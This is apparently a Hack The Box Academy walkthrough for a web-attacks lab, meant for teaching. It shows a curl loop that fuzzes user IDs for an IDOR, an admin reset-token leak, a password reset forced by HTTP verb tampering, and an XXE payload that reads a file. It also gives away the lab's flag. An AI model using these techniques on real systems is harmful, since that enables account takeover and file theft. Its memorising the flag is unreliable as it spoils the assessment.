# Web Attacks - Skills Assessment

## Question 1

### "Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'."

After spawning the target machine, students need to visit its website's root page and login with the credentials `htb-student:Academy_student!`, making sure to have the Network tab of the Web Developer Tools (`FN` + `F12`) open:

![Web_Attacks_Walkthrough_Image_34.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_34.png)

Inspecting the sent requests, students will notice that there is a GET request to the endpoint `/api.php/user/74` which retrieves the data to populates the user's info:

![Web_Attacks_Walkthrough_Image_35.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_35.png)

![Web_Attacks_Walkthrough_Image_36.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_36.png)

Students need to test if this endpoint is vulnerable to IDOR, by changing the `uid` value to be, for example, 75:

![Web_Attacks_Walkthrough_Image_37.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_37.png)

![Web_Attacks_Walkthrough_Image_38.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_38.png)

Checking the Response tab of the response received from the sent modified request, students will notice that the endpoint is indeed vulnerable to IDOR, as the data of the user with the `uid` 75 is returned back:

![Web_Attacks_Walkthrough_Image_39.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_39.png)

Subsequently, students need to fuzz the `uid` of users from 1 to 100:

Code: bash

```bash
#!/bin/bash

for uid in {1..100}; do
	curl -s "http://STMIP:STMPO/api.php/user/$uid"; echo
done
```

Since students are hunting for privileged users, they need to run the script and use `grep` to search for strings that contain `admin`, finding the user with `uid` 52:

Code: shell

```shell
bash fuzz | grep -i "admin" | jq .
```

  Web Attacks - Skills Assessment

```shell-session
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-1s2haz25lu]─[~]
└──╼ [★]$ bash fuzz | grep -i "admin" | jq .
{
  "uid": "52",
  "username": "a.corrales",
  "full_name": "Amor Corrales",
  "company": "Administrator"
}
```

However, the password of the user is still unknown. Analyzing the web application more deeply, students will notice that they can change the password of the current user via the `Settings` page (students need to have the Network tab open still):

![Web_Attacks_Walkthrough_Image_40.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_40.png)

When attempting to change the password, students will notice that the web application sends a GET request to the endpoint `/api/token/74`, and within the response of the request, the `token` of the user is returned, which is `e51a8a14-17ac-11ec-8e67-a3c050fe0c26` for the user with the `uid` of 74:

![Web_Attacks_Walkthrough_Image_41.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_41.png)

![Web_Attacks_Walkthrough_Image_42.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_42.png)

Instead of attaining the token for `uid` 74, students need to modify it to 52, as in `/api.php/token/52`:

![Web_Attacks_Walkthrough_Image_43.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_43.png)

![Web_Attacks_Walkthrough_Image_44.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_44.png)

When checking the response of the sent modified request, students will get `e51a85fa-17ac-11ec-8e51-e78234eb7b0c` as the `token` for the user with `uid` 52:

![Web_Attacks_Walkthrough_Image_45.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_45.png)

Checking the POST request to `reset.php`, students will notice that it requires three parameters, `uid`, `token`, and `password`:

![Web_Attacks_Walkthrough_Image_46.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_46.png)

Instead of reseting the password of the user with `uid` 74, students need to reset the one for `uid` 52, given that all three parameters are known (`uid:52`, `token:e51a85fa-17ac-11ec-8e51-e78234eb7b0c`, and `password` can be set to any arbitrary value, however, it is always a good practice to set it to a strong password to avoid other intruders from accessing the account; students can generate one with the command `openssl rand -hex 16`):

![Web_Attacks_Walkthrough_Image_47.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_47.png)

![Web_Attacks_Walkthrough_Image_48.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_48.png)

However, when checking the response to the request, students will notice that it says in the response "Access Denied", as the backend is most probably checking `PHPSESSID` against the `uid` being sent in the request:

![Web_Attacks_Walkthrough_Image_49.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_49.png)

Students need to bypass this security mechanism by attempting verb tampering, therefore sending a GET request instead of POST, sending the parameters as URL parameters, as in `http://STMIP:STMPO/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=f0e18de14fdadfc38350d97ff7284a25`:

![Web_Attacks_Walkthrough_Image_50.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_50.png)

![Web_Attacks_Walkthrough_Image_51.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_51.png)

After successfully changing the password, students need to sign in as the user `a.corrales` with the password that was used previously (`f0e18de14fdadfc38350d97ff7284a25` in here):

![Web_Attacks_Walkthrough_Image_52.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_52.png)

After successfully signing in as `a.corrales`, students will notice that there is a new feature of "adding events", thus, they need to click on "ADD EVENT":

![Web_Attacks_Walkthrough_Image_53.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_53.png)

With the Network tab of the Web Developer Tools open, students need to feed the fields any dummy data and inspect the POST request sent to `addEvent.php`, discovering that the request payload is `XML` data:

![Web_Attacks_Walkthrough_Image_54.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_54.png)

Students need to instead send a malicious XXE payload that will read the flag file "/flag.php" via the the PHP filter `convert.base64-encode`:

Code: xml

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
<root>
    <name>&xxe;</name>
    <details>test</details>
    <date>2021-09-22</date>
</root>
```

![Web_Attacks_Walkthrough_Image_55.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_55.png)

![Web_Attacks_Walkthrough_Image_56.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_56.png)

After sending the request and checking its response, students will attain the base64-encoded string `PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K`:

![Web_Attacks_Walkthrough_Image_57.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_57.png)

At last, students need to decode it to find the flag `HTB{m4573r_w3b_4774ck3r}`:

Code: shell

```shell
echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d
```

  Web Attacks - Skills Assessment

```shell-session
┌──(kali㉿kali)-[~]
└─$ echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d

<?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
```

Answer: {hidden}